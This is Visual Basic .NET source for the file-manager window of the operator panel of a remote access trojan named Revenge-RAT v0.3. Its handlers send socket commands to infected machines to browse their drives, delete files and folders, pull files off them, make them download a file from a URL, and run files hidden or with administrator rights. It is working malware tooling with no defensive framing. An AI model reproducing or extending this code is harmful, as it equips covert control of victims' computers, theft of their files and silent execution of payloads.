Imports Microsoft.VisualBasic.CompilerServices
Imports System.IO
Imports System.Runtime.CompilerServices
Imports Revenge_RAT_v0._3.RevengeRAT
Imports System.Drawing.IconLib
Imports Revenge_RAT_v0._3.Main

Public Class FileManager
    Private m_SortingColumn As ColumnHeader
    Public OPD As Boolean
    Public OSPath As Object
    Public Path As String
    Public R As Object
    Public sock As Integer
    Public Sub New()
        Me.OPD = False
        Me.InitializeComponent()
    End Sub

    Private Sub AsAdministratorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AsAdministratorToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Files.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (current.SubItems.Item(0).Text <> "...") Then
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Execute" & My.Forms.Main.Key), SocketServer.Encode((Me.Pathloc.Text & current.SubItems.Item(0).Text))), My.Forms.Main.Key), "Admin")}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub
    Public Sub Backb()
        If (Me.Pathloc.Text.Length = 3) Then
            Me.Pathloc.Text = ""
            Me.Files.Items.Clear()
        ElseIf (Me.Pathloc.Text.Length > 3) Then
            Me.Pathloc.Text = Me.Pathloc.Text.Substring(0, Me.Pathloc.Text.LastIndexOf("\"))
            Me.Pathloc.Text = Me.Pathloc.Text.Substring(0, (Me.Pathloc.Text.LastIndexOf("\") + 1))
            Me.Files.Items.Clear()
            Me.RefreshList()
        End If
    End Sub

    Private Sub BackToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BackToolStripMenuItem.Click
        Me.Backb()
    End Sub

    Private Sub Delete_Click(sender As Object, e As EventArgs) Handles Delete.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Files.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (current.SubItems.Item(0).Text <> "...") Then
                    Dim flagArray As Boolean()
                    If (current.ImageIndex = 0) Then
                        Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Delete" & My.Forms.Main.Key), SocketServer.Encode((Me.Pathloc.Text & current.SubItems.Item(0).Text))), My.Forms.Main.Key), "Folder")}
                        flagArray = New Boolean() {True, False}
                        NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, flagArray, True)
                        If flagArray(0) Then
                            Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                        End If
                    Else
                        Dim objArray As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Delete" & My.Forms.Main.Key), SocketServer.Encode((Me.Pathloc.Text & current.SubItems.Item(0).Text))), My.Forms.Main.Key), "File")}
                        flagArray = New Boolean() {True, False}
                        NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", objArray, Nothing, Nothing, flagArray, True)
                        If flagArray(0) Then
                            Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(Integer)))
                        End If
                    End If
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
        Me.Files.View = View.Details
        Me.Files.FullRowSelect = True
        Me.DetailsToolStripMenuItem.Checked = True
        Me.LargeToolStripMenuItem.Checked = False
        Me.TitleToolStripMenuItem.Checked = False
        Me.ListToolStripMenuItem.Checked = False
    End Sub

    Private Sub DiscoverWhatInsideRarFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DiscoverWhatInsideRarFileToolStripMenuItem.Click
        If (((((((((((((((((((((((((((((Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".zip") Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".ZIP")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".rar")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".RAR")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".7z")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".7Z")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".jar")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".JAR")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".tar")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".TAR")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".tgz")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".TGZ")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".gz")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".GZ")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".bz2")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".BZ2")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".tbz2")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".TBZ2")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".gzip")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".GZIP")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".z")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".Z")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".sit")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".SIT")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".cab")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".CAB")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".lzh")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".LZH")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".pkg")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".PKG")) Then
            Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("RARFiles" & My.Forms.Main.Key), SocketServer.Encode((Me.Pathloc.Text & Me.Files.FocusedItem.SubItems.Item(0).Text)))}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
            Me.RF.Text = (Me.Pathloc.Text & Me.Files.FocusedItem.SubItems.Item(0).Text)
            Me.UltimatumTabControl1.SelectedIndex = 4
            Me.GRF.Enabled = False
            Me.RF.Enabled = False
            Me.ToolStripStatusLabel7.Text = "Please wait a moment ..."
        End If
    End Sub

    Private Sub Download_Click(sender As Object, e As EventArgs) Handles Download.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.SearchFiles.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(((("Download" & My.Forms.Main.Key) & "DW" & My.Forms.Main.Key) & "DW" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(0).Text))}
                Dim copyBack As Boolean() = New Boolean() {True, False}
                NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                If copyBack(0) Then
                    Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub DownloadFileViaURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadFileViaURLToolStripMenuItem.Click
        Me.OPD = True
        If (My.Application.OpenForms.Item("FDUR") Is Nothing) Then
            Dim input As String = Interaction.InputBox("Enter your link!", "Revenge-RAT v0.3", "www.Google.com/examlpe.exe", -1, -1)
            If (input <> Nothing) Then
                Dim str2 As String = Interaction.InputBox("Enter your file name!", "Revenge-RAT v0.3", "examlpe.exe", -1, -1)
                If (str2 <> Nothing) Then
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("DFVURL" & My.Forms.Main.Key), SocketServer.Encode(input)), My.Forms.Main.Key), SocketServer.Encode((Me.Pathloc.Text & str2)))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                End If
            End If
        End If
    End Sub

    Private Sub DownloadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Files.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (current.ImageIndex <> 0) Then
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(((("Download" & My.Forms.Main.Key) & "DW" & My.Forms.Main.Key) & "DW" & My.Forms.Main.Key), SocketServer.Encode((Me.Pathloc.Text & current.SubItems.Item(0).Text)))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub En_Click(sender As Object, e As EventArgs) Handles En.Click
        If (Me.Pathloc.Text.Length > 0) Then
            Me.En.Enabled = False
            Me.Re.Enabled = False
            Me.FS()
            Me.GoToP()

            If Not Me.Pathloc.Text.EndsWith("\") Then
                Me.Pathloc.Text = (Me.Pathloc.Text & "\")
            End If
        End If
    End Sub

    Private Sub ExecuteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExecuteToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.SearchFiles.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Execute" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(0).Text)), My.Forms.Main.Key), "Normal")}
                Dim copyBack As Boolean() = New Boolean() {True, False}
                NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                If copyBack(0) Then
                    Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub FileManager_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        My.Forms.Main.s.Send(Me.sock, "Abort")
    End Sub

    Private Sub FileManager_Load(sender As Object, e As EventArgs) Handles Me.Load
        Dim num2 As Integer
        Dim num As Integer = 0
        Do
            Me.UltimatumTabControl1.TabPages.Item(num).BackColor = SystemColors.Window
            num += 1
            num2 = 4
        Loop While (num <= num2)
        Me.ImageList4.Images.Clear()
        Me.ImageList4.Images.Add(My.Resources.rsz_shell32_51380)
        Me.ImageList4.Images.Add(My.Resources.rsz_imageres_110)
        Me.ImageList4.Images.Add(My.Resources.rsz_imageres_184)
        Me.ImageList4.Images.Add(My.Resources.rsz_imageres_112)
        Me.ImageList4.Images.Add(My.Resources.rsz_filehistory_162)
        Me.ImageList4.Images.Add(My.Resources.rsz_imageres_115)
        Me.ImageList4.Images.Add(My.Resources.rsz_shell32_37219)
        Me.ImageList4.Images.Add(My.Resources.rsz_imageres_4)
        Me.ImageList4.Images.Add(My.Resources.rsz_imageres_109)
        Me.ImageList4.Images.Add(My.Resources.rsz_imageres_36)
        Me.ImageList4.Images.Add(My.Resources.rsz_imageres_35)
        Me.ImageList4.Images.Add(My.Resources.rsz_imageres_37)
        Me.ImageList4.Images.Add(My.Resources.rsz_imageres_58)
        Me.ImageList4.Images.Add(My.Resources.rsz_imageres_33)
        Me.ImageList4.Images.Add(My.Resources.rsz_imageres_75)
        Me.Fxtrv1.Nodes.Item(0).ExpandAll()
        Me.Fxtrv1.Nodes.Item(1).ExpandAll()
        Me.Files.GridLines = My.Forms.Main.Listview1.GridLines
        Me.Downloads.GridLines = My.Forms.Main.Listview1.GridLines
        Me.SearchFiles.GridLines = My.Forms.Main.Listview1.GridLines
        My.Forms.Main.s.Send(Me.sock, "GetDrives")
    End Sub

    Private Sub Files_ColumnClick(sender As Object, e As ColumnClickEventArgs) Handles Files.ColumnClick
        Dim ascending As SortOrder
        Dim header As ColumnHeader = DirectCast(NewLateBinding.LateGet(sender, Nothing, "Columns", New Object() {e.Column}, Nothing, Nothing, Nothing), ColumnHeader)
        If (Me.m_SortingColumn Is Nothing) Then
            ascending = SortOrder.Ascending
        ElseIf header.Equals(Me.m_SortingColumn) Then
            If Operators.ConditionalCompareObjectEqual(Me.m_SortingColumn.Tag, "+", False) Then
                ascending = SortOrder.Descending
            Else
                ascending = SortOrder.Ascending
            End If
        Else
            ascending = SortOrder.Ascending
        End If
        Me.m_SortingColumn = header
        If (ascending = SortOrder.Ascending) Then
            Me.m_SortingColumn.Tag = "+"
        Else
            Me.m_SortingColumn.Tag = "-"
        End If
        If (Not sender Is Nothing) Then
            NewLateBinding.LateSet(sender, Nothing, "ListViewItemSorter", New Object() {New clsListviewSorter(e.Column, ascending)}, Nothing, Nothing)
            NewLateBinding.LateCall(sender, Nothing, "Sort", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateSet(sender, Nothing, "ListViewItemSorter", New Object() {Nothing}, Nothing, Nothing)
        End If
    End Sub

    Private Sub Files_DoubleClick(sender As Object, e As EventArgs) Handles Files.DoubleClick
        If (Me.Files.SelectedItems.Count = 1) Then
            If (Me.Files.FocusedItem.Text = "...") Then
                Me.Backb()
            ElseIf (Me.Files.FocusedItem.ImageIndex = 0) Then
                Me.Pathloc.Text = (Me.Pathloc.Text & Me.Files.FocusedItem.SubItems.Item(0).Text & "\")
                Me.Files.Items.Clear()
                Me.RefreshList()
            ElseIf (((((((Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".txt") Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".TXT")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".log")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".LOG")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".readme")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".README")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".me")) Or Me.Files.FocusedItem.SubItems.Item(0).Text.EndsWith(".ME")) Then
                Me.UltimatumTabControl1.SelectedIndex = 5
                Me.TextPath.Text = (Me.Pathloc.Text & Me.Files.FocusedItem.SubItems.Item(0).Text)
                Me.RT()
            End If
        End If
    End Sub
    Public Sub FS()
        Me.Files.Items.Clear()
        Me.Files.Enabled = False
        Me.Fxtrv1.Enabled = False
        Me.Pathloc.Enabled = False
        Me.ToolStripStatusLabel1.Text = "Please wait a moment ..."
    End Sub

    Private Sub Fxtrv1_DoubleClick(sender As Object, e As EventArgs) Handles Fxtrv1.DoubleClick
        Try
            If ((Me.Fxtrv1.SelectedNode.Text <> "Quick Access") AndAlso (Me.Fxtrv1.SelectedNode.Text <> "My Computer")) Then
                If (Me.Fxtrv1.SelectedNode.Text = "Desktop") Then
                    My.Forms.Main.s.Send(Me.sock, "GetDesktopPath")
                ElseIf (Me.Fxtrv1.SelectedNode.Text = "Downloads") Then
                    My.Forms.Main.s.Send(Me.sock, "GDP")
                ElseIf (Me.Fxtrv1.SelectedNode.Text = "Documents") Then
                    My.Forms.Main.s.Send(Me.sock, "GDOP")
                ElseIf (Me.Fxtrv1.SelectedNode.Text = "Favorite") Then
                    My.Forms.Main.s.Send(Me.sock, "GFP")
                ElseIf (Me.Fxtrv1.SelectedNode.Text = "Pictures") Then
                    My.Forms.Main.s.Send(Me.sock, "GPP")
                ElseIf (Me.Fxtrv1.SelectedNode.Text = "Startup") Then
                    My.Forms.Main.s.Send(Me.sock, "GetStartupPath")
                ElseIf (Me.Fxtrv1.SelectedNode.Text = "AppData") Then
                    My.Forms.Main.s.Send(Me.sock, "GetAppDataPath")
                ElseIf (Me.Fxtrv1.SelectedNode.Text = "Temp") Then
                    My.Forms.Main.s.Send(Me.sock, "GetTempPath")
                Else
                    Me.Pathloc.Text = Me.Fxtrv1.SelectedNode.Text
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("GetFiles-Directorys" & My.Forms.Main.Key), SocketServer.Encode(Me.Pathloc.Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                End If
                Me.FS()
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Fxtrv1_NodeMouseHover(sender As Object, e As TreeNodeMouseHoverEventArgs) Handles Fxtrv1.NodeMouseHover
        Dim tip As New ToolTip
        tip.AutomaticDelay = 750
        tip.AutoPopDelay = 750
        tip.Show(e.Node.ToolTipText, Me.Fxtrv1)
    End Sub

    Private Sub Go_Click(sender As Object, e As EventArgs) Handles Go.Click
        Me.RT()
    End Sub
    Public Sub GoToP()
        If (Me.Pathloc.Text.Length > 3) Then
            Me.Files.Items.Add("...", 0)
            Me.BackToolStripMenuItem.Enabled = True
        Else
            Me.BackToolStripMenuItem.Enabled = False
        End If
        Me.Pathloc.Enabled = False
        Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("GetFiles-Directorys" & My.Forms.Main.Key), SocketServer.Encode(Me.Pathloc.Text))}
        Dim copyBack As Boolean() = New Boolean() {True, False}
        NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
        If copyBack(0) Then
            Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
        End If
    End Sub

    Private Sub GRF_Click(sender As Object, e As EventArgs) Handles GRF.Click
        If ((Me.RF.Text.Length > 0) AndAlso (((((((((((((((((((((((((((((Me.RF.Text.EndsWith(".zip") Or Me.RF.Text.EndsWith(".ZIP")) Or Me.RF.Text.EndsWith(".rar")) Or Me.RF.Text.EndsWith(".RAR")) Or Me.RF.Text.EndsWith(".7z")) Or Me.RF.Text.EndsWith(".7Z")) Or Me.RF.Text.EndsWith(".jar")) Or Me.RF.Text.EndsWith(".JAR")) Or Me.RF.Text.EndsWith(".tar")) Or Me.RF.Text.EndsWith(".TAR")) Or Me.RF.Text.EndsWith(".tgz")) Or Me.RF.Text.EndsWith(".TGZ")) Or Me.RF.Text.EndsWith(".gz")) Or Me.RF.Text.EndsWith(".GZ")) Or Me.RF.Text.EndsWith(".bz2")) Or Me.RF.Text.EndsWith(".BZ2")) Or Me.RF.Text.EndsWith(".tbz2")) Or Me.RF.Text.EndsWith(".TBZ2")) Or Me.RF.Text.EndsWith(".gzip")) Or Me.RF.Text.EndsWith(".GZIP")) Or Me.RF.Text.EndsWith(".z")) Or Me.RF.Text.EndsWith(".Z")) Or Me.RF.Text.EndsWith(".sit")) Or Me.RF.Text.EndsWith(".SIT")) Or Me.RF.Text.EndsWith(".cab")) Or Me.RF.Text.EndsWith(".CAB")) Or Me.RF.Text.EndsWith(".lzh")) Or Me.RF.Text.EndsWith(".LZH")) Or Me.RF.Text.EndsWith(".pkg")) Or Me.RF.Text.EndsWith(".PKG"))) Then
            Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("RARFiles" & My.Forms.Main.Key), SocketServer.Encode(Me.RF.Text))}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
            Me.GRF.Enabled = False
            Me.Re.Enabled = False
            Me.ListView2.Enabled = False
            Me.ToolStripStatusLabel7.Text = "Please wait a moment ..."
        End If
    End Sub

    Private Sub HiddenToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HiddenToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Files.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (current.SubItems.Item(0).Text <> "...") Then
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Execute" & My.Forms.Main.Key), SocketServer.Encode((Me.Pathloc.Text & current.SubItems.Item(0).Text))), My.Forms.Main.Key), "Hidden")}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub LargeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LargeToolStripMenuItem.Click
        Me.Files.View = View.LargeIcon
        Me.Files.FullRowSelect = True
        Me.DetailsToolStripMenuItem.Checked = False
        Me.LargeToolStripMenuItem.Checked = True
        Me.TitleToolStripMenuItem.Checked = False
        Me.ListToolStripMenuItem.Checked = False
    End Sub

    Private Sub Lim1_DoubleClick(sender As Object, e As EventArgs) Handles Lim1.DoubleClick
        Try
            If ((Me.Lim1.SelectedItems.Count > 0) AndAlso Me.Lim1.SelectedItems.Item(0).Tag.ToString.Contains("Thumbnail")) Then
                MessageBox.Show(Conversions.ToString(Me.Lim1.SelectedItems.Item(0).Tag), "Thumbnail Information", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub ListToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ListToolStripMenuItem.Click
        Me.Files.View = View.List
        Me.Files.FullRowSelect = True
        Me.DetailsToolStripMenuItem.Checked = False
        Me.LargeToolStripMenuItem.Checked = False
        Me.TitleToolStripMenuItem.Checked = False
        Me.ListToolStripMenuItem.Checked = True
    End Sub

    Private Sub NormalToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NormalToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Files.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (current.SubItems.Item(0).Text <> "...") Then
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Execute" & My.Forms.Main.Key), SocketServer.Encode((Me.Pathloc.Text & current.SubItems.Item(0).Text))), My.Forms.Main.Key), "Normal")}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub OpenDownloadFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenDownloadFolderToolStripMenuItem.Click
        Process.Start(Me.Path)
    End Sub

    Private Sub Pathloc_KeyDown(sender As Object, e As KeyEventArgs) Handles Pathloc.KeyDown
        If (Me.Pathloc.Text.Length > 0) Then
            If (e.KeyCode = Keys.Enter) Then
                If Me.Pathloc.Multiline Then
                    Me.Pathloc.Multiline = False
                End If
                If Not Me.Pathloc.Text.EndsWith("\") Then
                    Me.Pathloc.Text = (Me.Pathloc.Text & "\")
                End If
                Me.FS()
                Me.GoToP()
            End If
            If Not Me.Pathloc.Multiline Then
                Me.Pathloc.Multiline = True
            End If
        End If
    End Sub

    Private Sub PauseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PauseToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Downloads.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If ((current.SubItems.Item(4).Text = "Downloading") Or (current.SubItems.Item(4).Text = "Wating")) Then
                    My.Forms.Main.s.Send(Conversions.ToInteger(current.ToolTipText), "Pause")
                    current.SubItems.Item(4).Text = "Suspend"
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub PropertiesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PropertiesToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Files.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim flagArray As Boolean()
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (current.ImageIndex = 0) Then
                    If (current.SubItems.Item(0).Text <> "...") Then
                        Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject((("FPRO" & My.Forms.Main.Key) & Conversions.ToString(False) & My.Forms.Main.Key), SocketServer.Encode((Me.Pathloc.Text & current.SubItems.Item(0).Text)))}
                        flagArray = New Boolean() {True, False}
                        NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, flagArray, True)
                        If flagArray(0) Then
                            Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                        End If
                    End If
                ElseIf (current.SubItems.Item(0).Text <> "...") Then
                    Dim objArray As Object() = New Object() {Me.sock, Operators.ConcatenateObject((("FPRO" & My.Forms.Main.Key) & Conversions.ToString(True) & My.Forms.Main.Key), SocketServer.Encode((Me.Pathloc.Text & current.SubItems.Item(0).Text)))}
                    flagArray = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", objArray, Nothing, Nothing, flagArray, True)
                    If flagArray(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(Integer)))
                    End If
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub Re_Click(sender As Object, e As EventArgs) Handles Re.Click
        If (Me.Pathloc.Text.Length > 0) Then
            Me.Files.Items.Clear()
            Me.RefreshList()
        End If
    End Sub
    Public Sub RefreshList()
        If (Me.Pathloc.Text.Length > 3) Then
            Me.Files.Items.Add("...", 0)
            Me.BackToolStripMenuItem.Enabled = True
        Else
            Me.BackToolStripMenuItem.Enabled = False
        End If
        Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("GetFiles-Directorys" & My.Forms.Main.Key), SocketServer.Encode(Me.Pathloc.Text))}
        Dim copyBack As Boolean() = New Boolean() {True, False}
        NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
        If copyBack(0) Then
            Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
        End If
        Me.Files.Enabled = False
        Me.Fxtrv1.Enabled = False
        Me.En.Enabled = False
        Me.Re.Enabled = False
        Me.Pathloc.Enabled = False
        Me.ToolStripStatusLabel1.Text = "Please wait a moment ..."
    End Sub

